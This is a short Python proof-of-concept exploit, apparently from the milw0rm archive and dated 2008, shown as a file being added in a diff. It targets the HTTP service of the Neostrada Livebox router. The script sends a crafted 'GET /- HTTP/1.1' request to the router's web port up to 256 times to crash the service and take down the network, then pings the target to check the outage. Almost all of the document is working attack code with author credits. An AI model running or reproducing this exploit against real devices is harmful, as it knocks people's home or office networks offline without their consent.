@@ -1,0 +1,44 @@
+# Neostrada Livebox Router Remote Network Down PoC Exploit
+# Author: 0in aka zer0in from Dark-Coders Group!
+# Contact: 0in.email(at)gmail.com / 0in(at)dark-coders.pl
+# Site: http://dark-coders.pl
+# Greetings to: All Dark-Coders Members: die,doctor,m4r1usz,sun8hclf ;*
+# 		Friends: cOndemned,joker,chomzee,TBH
+#		IRC: #dark-coders & #pvt
+# Description:
+# 	When we send a "specially crafted http packet" x ~25
+#	Livebox HTTP service && all network goes down 
+# Simple PoC source:
+#!/usr/bin/python
+
+from socket import *
+import os
+import sys
+target = "192.168.1.1"
+def to_vuln(ip):
+	suck = socket(AF_INET,SOCK_STREAM,0)
+	try:
+		conn = suck.connect((ip,80))
+	except Exception:
+		check(ip)
+	return suck
+def check(ip):
+	print "[+] No HTTP response..."
+	print "[+] Server and network should go down!"
+	print "[+] Check it with ping..."
+	os.system("ping "+ip)
+i=0
+print "[!] Neostrada Livebox Remote Network Down Exploit!!"
+print "[!] 		[HTTP DoS vuln]		  "
+print "[!] 	by 0in [0in.email(at)gmail.com]		  "
+print "\n[+] Dosing..."
+for i in range(256):
+	pack3t = "GET /- HTTP/1.1\r\n\r\n" 
+	POC = to_vuln(target)
+	POC.send(pack3t)
+	try:
+		POC.recv(512)
+	except Exception:
+		check(target)
+
+# milw0rm.com [2008-12-08]
